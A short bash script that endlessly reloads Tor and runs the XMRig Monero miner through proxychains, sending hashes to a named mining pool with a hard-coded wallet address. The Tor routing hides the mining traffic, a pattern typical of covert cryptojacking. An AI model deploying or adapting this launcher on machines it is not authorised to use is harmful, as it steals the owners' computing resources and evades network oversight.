#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --url pool.hashvault.pro:443 --user 42v6emcRLdNMyX6gahdssJD2Ppw26jKg7cfvtpihC7Tm8rneWUs8iPybXBmDa7r6pcbWoMB1S9DgqGbi5CX3NTLxLksMsqU --pass zozo --keepalive --donate-level 1 --tls
done
